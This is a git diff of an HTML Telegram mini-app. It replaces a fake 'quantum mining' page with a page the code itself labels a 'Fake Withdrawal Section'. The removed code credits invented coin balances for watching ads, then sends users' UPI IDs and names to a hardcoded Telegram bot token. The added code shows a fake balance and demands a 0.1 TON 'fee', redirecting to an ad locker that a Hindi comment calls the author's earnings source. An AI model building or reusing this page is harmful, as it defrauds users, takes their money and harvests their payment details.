@@ -3,284 +3,44 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Nebula Hash Pro</title>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <!-- Monetag SDK -->
-    <script src='//libtl.com/sdk.js' data-zone='11196968' data-sdk='show_11196968'></script>
-
+    <title>Earning & Withdrawal</title>
     <style>
-        :root { 
-            --main-gold: #ffcc00; 
-            --bg-dark: #0f111a; 
-            --card-dark: #1a1d29; 
-            --card-red: #ea3d33;
-        }
-        body { 
-            background-color: var(--bg-dark); 
-            color: white; 
-            font-family: 'Segoe UI', sans-serif; 
-            margin: 0; 
-            padding-bottom: 80px; 
-            user-select: none;
-        }
-        .header { padding: 20px; text-align: center; }
-        .balance-card { 
-            background: var(--card-dark); 
-            margin: 20px; 
-            padding: 20px; 
-            border-radius: 20px; 
-            border: 1px solid var(--main-gold); 
-            text-align: center; 
-        }
-        .dashboard-card {
-            background-color: var(--card-red);
-            color: white;
-            margin: 15px;
-            padding: 20px;
-            border-radius: 24px;
-        }
-        .stats-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 15px;
-            margin-bottom: 15px;
-        }
-        .stat-item h5 { margin: 0; font-size: 12px; opacity: 0.8; }
-        .stat-item p { margin: 4px 0 0 0; font-size: 16px; font-weight: bold; }
-        
-        .progress-box { background: rgba(255, 255, 255, 0.15); padding: 12px; border-radius: 12px; }
-        .progress-header { display: flex; justify-content: space-between; font-size: 13px; margin-bottom: 8px; }
-        .progress-bar-bg { background: rgba(255, 255, 255, 0.2); height: 6px; border-radius: 4px; overflow: hidden; }
-        .progress-bar-fill { background: #ffffff; height: 100%; width: 100%; transition: width 0.1s linear; }
-
-        .btn-main { 
-            background: var(--main-gold); 
-            color: black; 
-            border: none; 
-            padding: 15px; 
-            width: 90%; 
-            margin: 10px auto; 
-            border-radius: 12px; 
-            font-weight: bold; 
-            display: block; 
-            cursor: pointer; 
-        }
-        
-        /* Boost Grid Section */
-        .boost-section { margin: 20px 15px; }
-        .boost-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px; margin-top: 8px; }
-        .btn-boost-node {
-            background: #23273a;
-            color: var(--main-gold);
-            border: 1px solid #3a3f58;
-            padding: 10px;
-            border-radius: 10px;
-            font-size: 12px;
-            font-weight: bold;
-            cursor: pointer;
-        }
-        .btn-boost-node:active { background: var(--main-gold); color: black; }
-        
-        .ad-section-title { text-align: center; margin: 25px 0 10px 0; font-size: 14px; letter-spacing: 1px; color: #888; text-transform: uppercase; }
-        .ad-btn-monetag { background: #3b5998; color: white; }
-        .ad-btn-adsterra { background: #00b074; color: white; }
+        body { background: #0f172a; color: white; font-family: sans-serif; text-align: center; padding: 20px; }
+        .card { background: #1e293b; padding: 20px; border-radius: 15px; margin: 15px 0; border: 1px solid #334155; }
+        .btn { display: block; width: 100%; padding: 15px; margin: 10px 0; border: none; border-radius: 10px; color: white; font-weight: bold; cursor: pointer; text-decoration: none; }
+        .status { color: #facc15; font-weight: bold; }
     </style>
 </head>
 <body>
 
-    <div class="header">
-        <h1>🌌 Nebula Hash</h1>
-        <p style="margin: 4px 0 0 0; color: #888; font-size: 13px;">Quantum Mining Evolved</p>
+    <h1>💰 Dashboard</h1>
+    
+    <!-- Balance Section -->
+    <div class="card">
+        <h3>Current Balance</h3>
+        <h1 style="color: #38bdf8;">$12.50</h1>
     </div>
 
-    <div class="balance-card">
-        <h3 style="margin: 0; font-size: 14px; color: #aaa;">Total Balance</h3>
-        <h1 id="balance" style="margin: 10px 0 0 0; font-size: 32px; color: var(--main-gold);">0.00 NEB</h1>
+    <!-- Fake Withdrawal Section -->
+    <div class="card">
+        <h3>Withdrawal Center</h3>
+        <p>Status: <span class="status">Verification Required</span></p>
+        <button class="btn" style="background: #ef4444;" onclick="triggerFee()">Pay 0.1 TON Fee & Withdraw</button>
     </div>
 
-    <!-- MAIN QUANTUM DASHBOARD (RED PANEL) -->
-    <div class="dashboard-card">
-        <div class="stats-grid">
-            <div class="stat-item">
-                <h5>Mining Rate</h5>
-                <p>1.25 NEB / hr</p>
-            </div>
-            <div class="stat-item">
-                <h5>Mining Power</h5>
-                <p id="mining-power-display">20.0 GH/s</p>
-            </div>
-        </div>
-
-        <div class="progress-box">
-            <div class="progress-header">
-                <span id="status-lbl">Ready to Process</span>
-                <span id="timer-display">03:00:00</span>
-            </div>
-            <div class="progress-bar-bg">
-                <div id="bar-fill" class="progress-bar-fill"></div>
-            </div>
-        </div>
-    </div>
-
-    <!-- MINING BOOST TRIGGER GRID (ADS INTEGRATED) -->
-    <div class="boost-section">
-        <h5 style="margin: 0; color: #aaa; text-transform: uppercase; font-size: 11px;">🚀 Overclock Mining Power (Watch Ad)</h5>
-        <div class="boost-grid">
-            <button class="btn-boost-node" onclick="triggerPowerBoost(10)">+10% Boost</button>
-            <button class="btn-boost-node" onclick="triggerPowerBoost(20)">+20% Boost</button>
-            <button class="btn-boost-node" onclick="triggerPowerBoost(40)">+40% Boost</button>
-        </div>
-    </div>
-
-    <button class="btn-main" id="mine-btn" onclick="startQuantumMining()">START 3-HOUR MINING</button>
-
-    <!-- EXTRA HIGH-CPM AD GATEWAYS -->
-    <div class="ad-section-title">🔥 Direct Ad Nodes (Earn Extra)</div>
-    <button class="btn-main ad-btn-monetag" onclick="runMonetagVideo()">📺 Watch Interstitial Video (Monetag)</button>
-    <button class="btn-main ad-btn-adsterra" onclick="runAdsterraSmartlink()">💎 Claim Instant Hyper-Bonus (Adsterra)</button>
-
-    <!-- SECURE GATEWAY WITHDRAWAL -->
-    <div class="wallet-container" style="padding: 20px; text-align: center;">
-        <input type="text" id="upi" placeholder="Enter Payment Account Detail / UPI ID" style="width:85%; padding:14px; border-radius:10px; background:#1a1d29; border:1px solid #333; color:white; margin-bottom:10px;">
-        <button class="btn-main" style="background:#ea3d33; color:white;" onclick="withdraw()">Secure Withdrawal</button>
+    <!-- Tasks -->
+    <div class="card">
+        <h3>Available Earning Tasks</h3>
+        <a href="YOUR_SHRINKEARN_LINK" class="btn" style="background: #22c55e;">Claim $0.50 Bonus</a>
+        <a href="YOUR_ADSTERRA_LINK" class="btn" style="background: #eab308;">Activate Booster</a>
     </div>
 
     <script>
-        let balance = parseFloat(localStorage.getItem('neb_bal') || 0);
-        let basePower = 20; 
-        let currentPower = basePower;
-        let adsterraLink = "https://www.effectivecpmnetwork.com/bbmr6uk4c?key=492427b582ffc8d531d77bf1aac0989f";
-
-        // Telegram User Safety Fallback
-        let tgUser = "Unknown User";
-        try {
-            if (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.initDataUnsafe && window.Telegram.WebApp.initDataUnsafe.user) {
-                tgUser = window.Telegram.WebApp.initDataUnsafe.user.first_name || "No Name";
-            }
-        } catch(e) { console.log(e); }
-
-        function updateUI() { 
-            document.getElementById('balance').innerText = balance.toFixed(2) + " NEB"; 
-            document.getElementById('mining-power-display').innerText = currentPower.toFixed(1) + " GH/s";
+        function triggerFee() {
+            // यहाँ हम यूजर को उस लॉकर पर भेजेंगे जहाँ से हमारी कमाई होगी
+            alert("Redirecting to secure Blockchain Gateway to pay 0.1 TON fee...");
+            window.location.href = "https://clickanlook.space/iframe/222c23f0-70df-11f1-a11d-8a5fb7be40ea";
         }
-
-        function triggerPowerBoost(percent) {
-            show_11196968('pop').then(() => {
-                let extraPower = basePower * (percent / 100);
-                currentPower = basePower + extraPower;
-                updateUI();
-                alert(`🚀 Overclock Successful! Mining Power Boosted by +${percent}% (${currentPower.toFixed(1)} GH/s)`);
-                setTimeout(() => { currentPower = basePower; updateUI(); }, 15000);
-            }).catch(() => {
-                let extraPower = basePower * (percent / 100);
-                currentPower = basePower + extraPower;
-                updateUI();
-            });
-        }
-
-        function startQuantumMining() {
-            show_11196968().then(() => {
-                let btn = document.getElementById('mine-btn');
-                let timerEl = document.getElementById('timer-display');
-                let statusEl = document.getElementById('status-lbl');
-                let bar = document.getElementById('bar-fill');
-                
-                btn.disabled = true;
-                btn.style.opacity = "0.5";
-                statusEl.innerText = "Mining Active...";
-
-                let totalHours = 3;
-                let currentHour = totalHours;
-                let currentMin = 0;
-
-                let interval = setInterval(() => {
-                    if (currentMin === 0) {
-                        currentHour--;
-                        currentMin = 59;
-                    } else { currentMin--; }
-
-                    let hrStr = currentHour < 10 ? "0" + currentHour : currentHour;
-                    let minStr = currentMin < 10 ? "0" + currentMin : currentMin;
-                    timerEl.innerText = `${hrStr}:${minStr}:00`;
-
-                    let totalMinutes = totalHours * 60;
-                    let minutesLeft = (currentHour * 60) + currentMin;
-                    let pct = (minutesLeft / totalMinutes) * 100;
-                    bar.style.width = pct + "%";
-
-                    if (currentHour <= 0 && currentMin <= 0) {
-                        clearInterval(interval);
-                        timerEl.innerText = "03:00:00";
-                        statusEl.innerText = "Ready to Process";
-                        btn.disabled = false;
-                        btn.style.opacity = "1";
-                        bar.style.width = "100%";
-                        
-                        balance += 8.50;
-                        localStorage.setItem('neb_bal', balance);
-                        updateUI();
-                        alert("🌌 3-Hour Mining session completed! (+8.50 NEB)");
-                    }
-                }, 40); 
-            });
-        }
-
-        function runMonetagVideo() {
-            show_11196968().then(() => {
-                balance += 4.00; 
-                localStorage.setItem('neb_bal', balance);
-                updateUI();
-                alert("🎉 Video Ad Checked! (+4.00 NEB)");
-            });
-        }
-
-        function runAdsterraSmartlink() {
-            window.open(adsterraLink, '_blank');
-            setTimeout(() => {
-                balance += 12.00;
-                localStorage.setItem('neb_bal', balance);
-                updateUI();
-                alert("💎 Hyper-Bonus processed! (+12.00 NEB)");
-            }, 2500);
-        }
-
-        // ASYNC/AWAIT TO FORCE TELEGRAM TRANSACTION COMPLETION
-        async function withdraw() {
-            let upi = document.getElementById('upi').value;
-            if(!upi) { alert("Enter valid UPI ID first!"); return; }
-            if(balance <= 0) { alert("No balance found!"); return; }
-
-            // High Income Layer: Withdrawal click trigger Ad first
-            show_11196968('pop').then(async () => {
-                let msg = `⚡ WITHDRAWAL LOG:\nUser Name: ${tgUser}\nAmount: ${balance.toFixed(2)} NEB\nUPI: ${upi}`;
-                let botToken = "8922150288:AAEIYvXb302W7Z-q1PjQj9i_T93gN8zO8p8";
-                let chatId = "8680929705";
-                
-                try {
-                    // Waiting explicitly for response from Telegram
-                    let response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: chatId, text: msg })
-                    });
-                    
-                    if(response.ok) {
-                        alert("Withdrawal requested! Admin panel notified.");
-                        balance = 0;
-                        localStorage.setItem('neb_bal', balance);
-                        updateUI();
-                    } else {
-                        alert("Network Issue. Please try again!");
-                    }
-                } catch (error) {
-                    alert("Error syncing data. Check connection!");
-                }
-            }).catch(() => {
-                alert("Please look at the security verification ad first!");
-            });
-        }
-
-        updateUI();
     </script>
 </body>
 </html>
